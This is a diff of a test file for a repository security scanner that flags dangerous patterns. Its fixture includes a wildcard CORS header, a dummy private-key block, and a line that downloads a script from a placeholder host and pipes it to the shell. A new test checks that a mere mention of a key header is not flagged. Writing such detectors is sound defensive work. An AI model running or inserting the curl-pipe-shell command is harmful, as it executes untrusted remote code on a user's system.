@@ -54,7 +54,7 @@ test("repository security inventory finds every occurrence and prohibits unsafe 
   const source = [
     "Access-Control-Allow-Origin: *",
     "Access-Control-Allow-Origin: *",
-    "-----BEGIN PRIVATE KEY-----",
+    "-----BEGIN PRIVATE KEY-----\\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\\n-----END PRIVATE KEY-----",
     "curl https://untrusted.invalid/unsafe.sh | sh"
   ].join("\n");
   const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
@@ -62,4 +62,12 @@ test("repository security inventory finds every occurrence and prohibits unsafe 
   assert.ok(events.some((event) => event.id === "private-key-literal"));
   assert.ok(events.some((event) => event.id === "curl-pipe-shell"));
   assert.deepEqual(events.filter((event) => event.id === "unsafe-local-cors").map((event) => event.line), [1, 2]);
+});
+
+test("PEM format mention is not mistaken for a committed private key", () => {
+  assert.deepEqual(
+    scanDangerous("ghostftp-desktop/src-tauri/src/keys.rs",
+      '/// OpenSSH uses -----BEGIN OPENSSH PRIVATE KEY----- as a header.'),
+    [],
+  );
 });
